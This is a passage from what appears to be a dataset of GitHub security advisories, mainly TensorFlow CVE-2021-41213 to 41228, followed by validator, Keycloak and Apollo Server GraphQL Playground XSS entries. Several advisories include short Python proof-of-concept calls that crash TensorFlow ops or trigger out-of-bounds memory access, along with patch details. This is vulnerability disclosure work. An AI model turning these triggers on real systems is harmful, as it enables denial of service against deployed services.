```python
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.RaggedCross(ragged_values=[],
                             ragged_row_splits=[],
                             sparse_indices=[[5]],
                             sparse_values=[],
                             sparse_shape=[5],
                             dense_inputs=[['a']],
                             input_order='RD',
                             hashed_output=False,
                             num_buckets=5,
                             hash_key=2,
                             out_values_type=tf.string,
                             out_row_splits_type=tf.int64)
  return y

test()
```

### Patches
We have patched the issue in GitHub commit [fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8](https://github.com/tensorflow/tensorflow/commit/fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
    
### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1953,20741,tensorflow,GHSA-h67m-xg8f-fxcf,CVE-2021-41213,https://github.com/advisories/GHSA-h67m-xg8f-fxcf,moderate,2021-11-10 18:59:32 UTC,Deadlock in mutually recursive `tf.function` objects,"### Impact
The [code behind `tf.function` API](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/python/eager/def_function.py#L542) can be made to deadlock when two `tf.function` decorated Python functions are mutually recursive:

```python 
import tensorflow as tf

@tf.function()               
def fun1(num):
    if num == 1:
        return
    print(num)
    fun2(num-1)

@tf.function()
def fun2(num):
    if num == 0:
        return
    print(num)
    fun1(num-1)

fun1(9)
```

This occurs due to using a non-reentrant `Lock` Python object.

Loading any model which contains mutually recursive functions is vulnerable. An attacker can cause denial of service by causing users to load such models and calling a recursive `tf.function`, although this is not a frequent scenario.

### Patches
We have patched the issue in GitHub commit [afac8158d43691661ad083f6dd9e56f327c1dcb7](https://github.com/tensorflow/tensorflow/commit/afac8158d43691661ad083f6dd9e56f327c1dcb7).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1954,20741,tensorflow,GHSA-vwhq-49r4-gj9v,CVE-2021-41214,https://github.com/advisories/GHSA-vwhq-49r4-gj9v,high,2021-11-10 18:58:16 UTC,Reference binding to `nullptr` in `tf.ragged.cross`,"### Impact
The [shape inference code for `tf.ragged.cross`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/ragged_array_ops.cc#L64) has an undefined behavior due to binding a reference to `nullptr`. In the following scenario, this results in a crash:

```python
import tensorflow as tf
  
@tf.function                 
def test():     
  y = tf.ragged.cross([tf.ragged.constant([['1']]),'2'])
  return y                   
                             
test()        
```                          
             
### Patches
We have patched the issue in GitHub commit [fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8](https://github.com/tensorflow/tensorflow/commit/fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8).
  
The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1955,20741,tensorflow,GHSA-x3v8-c8qx-3j3r,CVE-2021-41215,https://github.com/advisories/GHSA-x3v8-c8qx-3j3r,moderate,2021-11-10 18:57:45 UTC,Null pointer exception in `DeserializeSparse`,"### Impact
The [shape inference code for `DeserializeSparse`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/sparse_ops.cc#L152-L168) can trigger a null pointer dereference:

```python
import tensorflow as tf

dataset = tf.data.Dataset.range(3)
  
@tf.function                 
def test():                  
  y = tf.raw_ops.DeserializeSparse(
    serialized_sparse=tf.data.experimental.to_variant(dataset),
    dtype=tf.int32)

test()
```

This is because the shape inference function assumes that the `serialize_sparse` tensor is a tensor with positive rank (and having `3` as the last dimension).  However, in the example above, the argument is a scalar (i.e., rank 0).

### Patches
We have patched the issue in GitHub commit [d3738dd70f1c9ceb547258cbb82d853da8771850](https://github.com/tensorflow/tensorflow/commit/d3738dd70f1c9ceb547258cbb82d853da8771850).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1956,20741,tensorflow,GHSA-3ff2-r28g-w7h9,CVE-2021-41216,https://github.com/advisories/GHSA-3ff2-r28g-w7h9,moderate,2021-11-10 18:57:19 UTC,Heap buffer overflow in `Transpose`,"### Impact
The [shape inference function for `Transpose`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/array_ops.cc#L121-L185) is vulnerable to a heap buffer overflow:

```python
import tensorflow as tf
@tf.function
def test():
  y = tf.raw_ops.Transpose(x=[1,2,3,4],perm=[-10])
  return y

test()
```

This occurs whenever `perm` contains negative elements. The shape inference function does not validate that the indices in `perm` are all valid:
        
```cc
for (int32_t i = 0; i < rank; ++i) {
  int64_t in_idx = data[i];
  if (in_idx >= rank) {
    return errors::InvalidArgument(""perm dim "", in_idx,
                                   "" is out of range of input rank "", rank);
  }
  dims[i] = c->Dim(input, in_idx);
}
```

where `Dim(tensor, index)` accepts either a positive index less than the rank of the tensor or the special value `-1` for unknown dimensions.

### Patches
We have patched the issue in GitHub commit [c79ba87153ee343401dbe9d1954d7f79e521eb14](https://github.com/tensorflow/tensorflow/commit/c79ba87153ee343401dbe9d1954d7f79e521eb14).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1957,20741,tensorflow,GHSA-5crj-c72x-m7gq,CVE-2021-41217,https://github.com/advisories/GHSA-5crj-c72x-m7gq,moderate,2021-11-10 18:55:11 UTC,Null pointer exception when `Exit` node is not preceded by `Enter` op,"### Impact
The [process of building the control flow graph](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/common_runtime/immutable_executor_state.cc#L284-L346) for a TensorFlow model is vulnerable to a null pointer exception when nodes that should be paired are not:
  
```python
import tensorflow as tf
  
@tf.function
def func():
  return tf.raw_ops.Exit(data=[False,False])
    
func()
```

This occurs because the code assumes that the first node in the pairing (e.g., an `Enter` node) always exists when encountering the second node (e.g., an `Exit` node):
  
```cc
  ...
} else if (IsExit(curr_node)) {
  // Exit to the parent frame.
  parent = parent_nodes[curr_id];         
  frame_name = cf_info->frame_names[parent->id()];
  ...                
```

When this is not the case, `parent` is `nullptr` so dereferencing it causes a crash.

### Patches
We have patched the issue in GitHub commit [05cbebd3c6bb8f517a158b0155debb8df79017ff](https://github.com/tensorflow/tensorflow/commit/05cbebd3c6bb8f517a158b0155debb8df79017ff).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1958,20741,tensorflow,GHSA-9crf-c6qr-r273,CVE-2021-41218,https://github.com/advisories/GHSA-9crf-c6qr-r273,moderate,2021-11-10 18:52:24 UTC,Integer division by 0 in `tf.raw_ops.AllToAll`,"### Impact
The [shape inference code for `AllToAll`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/tpu_cross_replica_ops.cc#L25-L74) can be made to execute a division by 0:

```python
import tensorflow as tf
  
@tf.function
def func():
  return tf.raw_ops.AllToAll(
    input=[0.0, 0.1652, 0.6543],
    group_assignment=[1, -1],
    concat_dimension=0,
    split_dimension=0,
    split_count=0)

func()
```

This occurs whenever the `split_count` argument is 0:
  
```cc
TF_RETURN_IF_ERROR(c->GetAttr(""split_count"", &split_count));
...                  
for (int32_t i = 0; i < rank; ++i) {      
  ...                                     
  dims[i] = c->MakeDim(c->Value(dims[i]) / split_count);
  ...                
}
```

### Patches
We have patched the issue in GitHub commit [a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc](https://github.com/tensorflow/tensorflow/commit/a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1959,20741,tensorflow,GHSA-4f99-p9c2-3j8x,CVE-2021-41219,https://github.com/advisories/GHSA-4f99-p9c2-3j8x,high,2021-11-10 18:51:51 UTC,Undefined behavior via `nullptr` reference binding in sparse matrix multiplication,"### Impact
The [code for sparse matrix multiplication](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/sparse_matmul_op.cc#L954-L1086) is vulnerable to undefined behavior via binding a reference to `nullptr`:

```python
import tensorflow as tf
  
tf.raw_ops.SparseMatMul(
  a=[[1.0,1.0,1.0]],
  b=[[],[],[]],
  transpose_a=False,
  transpose_b=False,
  a_is_sparse=False, 
  b_is_sparse=True)
```

This occurs whenever the dimensions of `a` or `b` are 0 or less. In the case on one of these is 0, an empty output tensor should be allocated (to conserve the invariant that output tensors are always allocated when the operation is successful) but nothing should be written to it (that is, we should return early from the kernel implementation). Otherwise, attempts to write to this empty tensor would result in heap OOB access.

### Patches
We have patched the issue in GitHub commit [e6cf28c72ba2eb949ca950d834dd6d66bb01cfae](https://github.com/tensorflow/tensorflow/commit/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.
",pip
1960,20741,tensorflow,GHSA-gpfh-jvf9-7wg5,CVE-2021-41220,https://github.com/advisories/GHSA-gpfh-jvf9-7wg5,high,2021-11-10 18:51:21 UTC,Use after free / memory leak in `CollectiveReduceV2`,"### Impact
The [async implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/collective_ops.cc#L604-L615) of `CollectiveReduceV2` suffers from a memory leak and a use after free:

```python
import tensorflow as tf
  
tf.raw_ops.CollectiveReduceV2(
  input=[],
  group_size=[-10, -10, -10],
  group_key=[-10, -10],
  instance_key=[-10],
  ordering_token=[],
  merge_op='Mul',
  final_op='Div')
``` 

This occurs due to the asynchronous computation and the fact that objects that have been `std::move()`d from are still accessed:

```cc
auto done_with_cleanup = [col_params, done = std::move(done)]() {
  done();
  col_params->Unref();
};
OP_REQUIRES_OK_ASYNC(c,
                     FillCollectiveParams(col_params, REDUCTION_COLLECTIVE,
                                          /*group_size*/ c->input(1),
                                          /*group_key*/ c->input(2),
                                          /*instance_key*/ c->input(3)),
                     done);
```

Here, `done` is already moved from by the time `OP_REQUIRES_OK_ASYNC` macro needs to invoke it in case of errors. In this case, we get an undefined behavior, which can manifest via crashes, `std::bad_alloc` throws or just memory leaks.

### Patches
We have patched the issue in GitHub commit [ca38dab9d3ee66c5de06f11af9a4b1200da5ef75](https://github.com/tensorflow/tensorflow/commit/ca38dab9d3ee66c5de06f11af9a4b1200da5ef75).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, as this version is the only one that is also affected.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.
",pip
1961,20741,tensorflow,GHSA-cqv6-3phm-hcwx,CVE-2021-41221,https://github.com/advisories/GHSA-cqv6-3phm-hcwx,high,2021-11-10 18:50:17 UTC,Access to invalid memory during shape inference in `Cudnn*` ops,"### Impact
The [shape inference code](https://github.com/tensorflow/tensorflow/blob/9ff27787893f76d6971dcd1552eb5270d254f31b/tensorflow/core/ops/cudnn_rnn_ops.cc) for the `Cudnn*` operations in TensorFlow can be tricked into accessing invalid memory, via a heap buffer overflow:

```python
import tensorflow as tf

@tf.function
def func():
  return tf.raw_ops.CudnnRNNV3(
    input=[0.1, 0.1],
    input_h=[0.5],
    input_c=[0.1, 0.1, 0.1], 
    params=[0.5, 0.5],
    sequence_lengths=[-1, 0, 1])
  
func() 
```
  
This occurs because the ranks of the `input`, `input_h` and `input_c` parameters are not validated, but code assumes they have certain values:

```cc
auto input_shape = c->input(0);
auto input_h_shape = c->input(1);
auto seq_length = c->Dim(input_shape, 0);
auto batch_size = c->Dim(input_shape, 1);  // assumes rank >= 2
auto num_units = c->Dim(input_h_shape, 2); // assumes rank >= 3
``` 

### Patches
We have patched the issue in GitHub commit [af5fcebb37c8b5d71c237f4e59c6477015c78ce6](https://github.com/tensorflow/tensorflow/commit/af5fcebb37c8b5d71c237f4e59c6477015c78ce6).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1962,20741,tensorflow,GHSA-cpf4-wx82-gxp6,CVE-2021-41222,https://github.com/advisories/GHSA-cpf4-wx82-gxp6,moderate,2021-11-10 18:48:15 UTC,Segfault due to negative splits in `SplitV`,"### Impact
The [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/split_v_op.cc#L49-L205) of `SplitV` can trigger a segfault is an attacker supplies negative arguments:

```python
import tensorflow as tf

tf.raw_ops.SplitV(
  value=tf.constant([]),
  size_splits=[-1, -2]
  ,axis=0,
  num_split=2)
``` 
  
This occurs whenever `size_splits` contains more than one value and at least one value is negative.
  
### Patches 
We have patched the issue in GitHub commit [25d622ffc432acc736b14ca3904177579e733cc6](https://github.com/tensorflow/tensorflow/commit/25d622ffc432acc736b14ca3904177579e733cc6).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1963,20741,tensorflow,GHSA-f54p-f6jp-4rhr,CVE-2021-41223,https://github.com/advisories/GHSA-f54p-f6jp-4rhr,high,2021-11-10 18:46:52 UTC,Heap OOB in `FusedBatchNorm` kernels,"### Impact
The [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/fused_batch_norm_op.cc#L1292) of `FusedBatchNorm` kernels is vulnerable to a heap OOB:

```python
import tensorflow as tf
    
tf.raw_ops.FusedBatchNormGrad(
  y_backprop=tf.constant([i for i in range(9)],shape=(1,1,3,3),dtype=tf.float32)
  x=tf.constant([i for i in range(2)],shape=(1,1,1,2),dtype=tf.float32)
  scale=[1,1],
  reserve_space_1=[1,1],
  reserve_space_2=[1,1,1],
  epsilon=1.0,
  data_format='NCHW',
  is_training=True) 
```
  
### Patches
We have patched the issue in GitHub commit [aab9998916c2ffbd8f0592059fad352622f89cda](https://github.com/tensorflow/tensorflow/commit/aab9998916c2ffbd8f0592059fad352622f89cda).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1964,20741,tensorflow,GHSA-rg3m-hqc5-344v,CVE-2021-41224,https://github.com/advisories/GHSA-rg3m-hqc5-344v,high,2021-11-10 18:45:55 UTC,`SparseFillEmptyRows` heap OOB,"### Impact
The [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L194-L241) of `SparseFillEmptyRows` can be made to trigger a heap OOB access:

```python
import tensorflow as tf
  
data=tf.raw_ops.SparseFillEmptyRows(
  indices=[[0,0],[0,0],[0,0]],
  values=['sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss'],
  dense_shape=[5,3],
  default_value='o')
```
  
This occurs whenever the size of `indices` does not match the size of `values`.

### Patches
We have patched the issue in GitHub commit [67bfd9feeecfb3c61d80f0e46d89c170fbee682b](https://github.com/tensorflow/tensorflow/commit/67bfd9feeecfb3c61d80f0e46d89c170fbee682b).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1965,20741,tensorflow,GHSA-7r94-xv9v-63jw,CVE-2021-41225,https://github.com/advisories/GHSA-7r94-xv9v-63jw,moderate,2021-11-10 18:44:11 UTC,A use of uninitialized value vulnerability in Tensorflow,"### Impact
TensorFlow's Grappler optimizer has a [use of unitialized variable](https://github.com/tensorflow/tensorflow/blob/3457a2b122e50b4d44ceaaed5a663d635e5c22df/tensorflow/core/grappler/optimizers/auto_parallel.cc#L155-L164):

```cc
  const NodeDef* dequeue_node;
  for (const auto& train_node : train_nodes) {
    if (IsDequeueOp(*train_node)) {
      dequeue_node = train_node;
      break;
    }
  }

  if (dequeue_node) {
    ...
  }
```

If the `train_nodes` vector (obtained from the saved model that gets optimized) does not contain a `Dequeue` node, then `dequeue_node` is left unitialized.

### Patches
We have patched the issue in GitHub commit [68867bf01239d9e1048f98cbad185bf4761bedd3](https://github.com/tensorflow/tensorflow/commit/68867bf01239d9e1048f98cbad185bf4761bedd3).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Qian Feng from Baidu Security Team.
",pip
1966,20741,tensorflow,GHSA-374m-jm66-3vj8,CVE-2021-41226,https://github.com/advisories/GHSA-374m-jm66-3vj8,high,2021-11-10 18:41:47 UTC,Heap OOB in `SparseBinCount`,"### Impact
The [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/bincount_op.cc#L353-L417) of `SparseBinCount` is vulnerable to a heap OOB:

```python
import tensorflow as tf
  
  
tf.raw_ops.SparseBincount(
  indices=[[0],[1],[2]]
  values=[0,-10000000]
  dense_shape=[1,1]
  size=[1]
  weights=[3,2,1]
  binary_output=False)
```

This is because of missing validation between the elements of the `values` argument and the shape of the sparse output:


```cc
for (int64_t i = 0; i < indices_mat.dimension(0); ++i) {
  const int64_t batch = indices_mat(i, 0);
  const Tidx bin = values(i);
  ...
  out(batch, bin) = ...;
}
```

### Patches
We have patched the issue in GitHub commit [f410212e373eb2aec4c9e60bf3702eba99a38aba](https://github.com/tensorflow/tensorflow/commit/f410212e373eb2aec4c9e60bf3702eba99a38aba).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1967,20741,tensorflow,GHSA-j8c8-67vp-6mx7,CVE-2021-41227,https://github.com/advisories/GHSA-j8c8-67vp-6mx7,moderate,2021-11-10 18:34:49 UTC,Arbitrary memory read in `ImmutableConst`,"### Impact
The `ImmutableConst` operation in TensorFlow can be tricked into reading arbitrary memory contents:

```python
import tensorflow as tf
  
with open('/tmp/test','wb') as f:
    f.write(b'\xe2'*128)
    data = tf.raw_ops.ImmutableConst(dtype=tf.string,shape=3,memory_region_name='/tmp/test')
  
print(data)
```
  
This is because the `tstring` TensorFlow string class has a special case for memory mapped strings but the operation itself does not offer any support for this datatype.

### Patches
We have patched the issue in GitHub commit [3712a2d3455e6ccb924daa5724a3652a86f6b585](https://github.com/tensorflow/tensorflow/commit/3712a2d3455e6ccb924daa5724a3652a86f6b585) and GitHub commit [1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b](https://github.com/tensorflow/tensorflow/commit/1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b).
  
The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1968,20741,tensorflow,GHSA-3rcw-9p9x-582v,CVE-2021-41228,https://github.com/advisories/GHSA-3rcw-9p9x-582v,high,2021-11-10 16:54:02 UTC,Code injection in `saved_model_cli`,"### Impact
TensorFlow's `saved_model_cli` tool is vulnerable to a code injection as it [calls `eval` on user supplied strings](https://github.com/tensorflow/tensorflow/blob/87462bfac761435a46641ff2f10ad0b6e5414a4b/tensorflow/python/tools/saved_model_cli.py#L524-L550)
  
```python
def preprocess_input_exprs_arg_string(input_exprs_str):
  ... 
  for input_raw in filter(bool, input_exprs_str.split(';')):
    ...
    input_key, expr = input_raw.split('=', 1)
    input_dict[input_key] = eval(expr)
  ...
``` 
  
This can be used by attackers to run arbitrary code on the plaform where the CLI tool runs.

However, given that the tool is always run manually, the impact of this is not severe. We have patched this by adding a `safe` flag which defaults to `True` and an explicit warning for users.

### Patches
We have patched the issue in GitHub commit [8b202f08d52e8206af2bdb2112a62fafbc546ec7](https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Omer Kaspi from Vdoo.",pip
1969,16255,validator,GHSA-xx4c-jj58-r7x6,,https://github.com/advisories/GHSA-xx4c-jj58-r7x6,moderate,2021-11-19 20:14:23 UTC,Inefficient Regular Expression Complexity in Validator.js,"### Impact
Versions of `validator` prior to 13.7.0 are affected by an inefficient Regular Expression complexity  when using the `rtrim` and `trim` sanitizers.

### Patches
The problem has been patched in validator 13.7.0",npm
1970,35825,org.keycloak:keycloak-core,GHSA-c9x9-xv66-xp3v,CVE-2020-14389,https://github.com/advisories/GHSA-c9x9-xv66-xp3v,high,2021-11-10 15:30:36 UTC,Improper privilege management in Keycloak,"A flaw was found in Keycloak, where it would permit a user with a view-profile role to manage the resources in the new account console. This flaw allows a user with a view-profile role to access and modify data for which the user does not have adequate permission.",maven
1971,18230,apollo-server,GHSA-qm7x-rc44-rrqw,,https://github.com/advisories/GHSA-qm7x-rc44-rrqw,high,2021-11-08 18:07:42 UTC,Cross-site Scripting Vulnerability in GraphQL Playground (distributed by Apollo Server),"### Impact
In certain configurations, Apollo Server serves the client-side web app ""GraphQL Playground"" from the same web server that executes GraphQL operations. This web app has access to cookies and other credentials associated with the web server's operations. There is a cross-site scripting vulnerability in GraphQL Playground that allows for arbitrary JavaScript code execution in your web server's origin. If a user clicks a specially crafted link to your GraphQL Playground page served by Apollo Server, an attacker can steal cookies and other private browser data.

Details of the underlying GraphQL Playground vulnerability are available in [this `graphql-playground` advisory](https://github.com/graphql/graphql-playground/security/advisories/GHSA-59r9-6jp6-jcm7). (A [similar vulnerability](https://github.com/graphql/graphiql/security/advisories/GHSA-x4r7-m2q9-69c8) exists in the related `graphiql` project.) This advisory focuses on identifying whether *Apollo Server* installations are vulnerable and mitigating the vulnerability in Apollo Server; see the other advisories for details on the XSS vulnerability itself.

The impact of this vulnerability is more severe if (as is common) your GraphQL server's origin URL is an origin that is used to store sensitive data such as cookies.

In order for this vulnerability to affect your Apollo Server installation, it must actually serve GraphQL Playground. The integration between Apollo Server and GraphQL Playground is different in Apollo Server 2 and Apollo Server 3. You can tell which version of Apollo Server you are running by looking at the version of the [package from which you import the `ApolloServer` class](https://www.apollographql.com/docs/apollo-server/integrations/middleware/): this may be `apollo-server`, `apollo-server-express`, `apollo-server-lambda`, etc.

#### Apollo Server 3

Apollo Server 3 does not serve GraphQL Playground by default. It has a [landing page plugin system](https://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/) and the default plugin is a simple splash page that is not vulnerable to this exploit, linking to Apollo Sandbox Explorer. (We chose to change the default because GraphQL Playground is not actively maintained.)

If you are running Apollo Server 3, then you are *only* vulnerable if you *explicitly* import the [`ApolloServerPluginLandingPageGraphQLPlayground`](https://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/#graphql-playground-landing-page) plugin and pass it to your `ApolloServer`'s constructor in the `plugins` array. Otherwise, this advisory does not apply to your server.

#### Apollo Server 2

Apollo Server 2 serves GraphQL Playground by default, unless the `NODE_ENV` environment variable is set to `production`, or if you explicitly configure it via the `playground` option to the `ApolloServer` constructor.

Your Apollo Server 2 installation is vulnerable if *any* of the following is true:
- You pass `playground: true` to the `ApolloServer` constructor
- You pass some other object like `playground: {title: ""Title""}` to the `ApolloServer` constructor
- You do *not* pass any `playground` option to the `ApolloServer` constructor, *and* the `NODE_ENV` environment variable is *not* set to `production`

#### Apollo Server 1

Apollo Server 1 included `graphiql` instead of `graphql-playground`. `graphiql` isn't automatically enabled in Apollo Server 1: you have to explicitly call a function such as `graphiqlExpress` to enable it. Because Apollo Server 1 is not commonly used, we have not done a detailed examination of whether the integration between Apollo Server 1 and `graphiql` is vulnerable to a similar exploit. If you are still using Apollo Server 1, we recommend you disable `graphiql` by removing the `graphiqlExpress` call, and then upgrade to a newer version of Apollo Server.

### Patches and workarounds

There are several approaches you can take to ensure that your server is not vulnerable to this issue.

#### Upgrade Apollo Server

The vulnerability has been patched in Apollo Server 2.25.3 and Apollo Server 3.4.1. To get the patch, upgrade your [Apollo Server entry point package](https://www.apollographql.com/docs/apollo-server/integrations/middleware/) to one of the fixed versions; this package may be `apollo-server`, `apollo-server-express`, `apollo-server-lambda`, etc. Additionally, if you depend directly on `apollo-server-core` in your `package.json`, make sure that you upgrade it to the same version.

#### Upgrade Playground version only

If upgrading to the latest version of Apollo Server 2 or 3 quickly will be challenging, you can configure your current version of Apollo Server to serve the latest version of the GraphQL Playground app. This will pin your app to serve a specific version of GraphQL Playground and you will not receive updates to it when you upgrade Apollo Server later, but this may be acceptable because GraphQL Playground is not actively maintained.

The way to do this depends on what version of Apollo Server you're using and if you're already configuring GraphQL Playground.

- **Apollo Server 3**: If you are using Apollo Server 3, then you are only vulnerable if your serve explicitly calls [`ApolloServerPluginLandingPageGraphQLPlayground`](https://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/#graphql-playground-landing-page) and passes it to the Apollo Server constructor in the `plugins` array. Add the option `version: '1.7.42'` to this call, so it looks like:
```
plugins: [ApolloServerPluginLandingPageGraphQLPlayground({version: '1.7.42'})]
```
- **Apollo Server 2 with no explicit `playground` option**: If you are using Apollo Server 2 and do not currently pass the `playground` option to `new ApolloServer`, add a `playground` option like so: 
```
new ApolloServer({ playground: process.env.NODE_ENV === 'production' ? false : { version: '1.7.42' } })
```
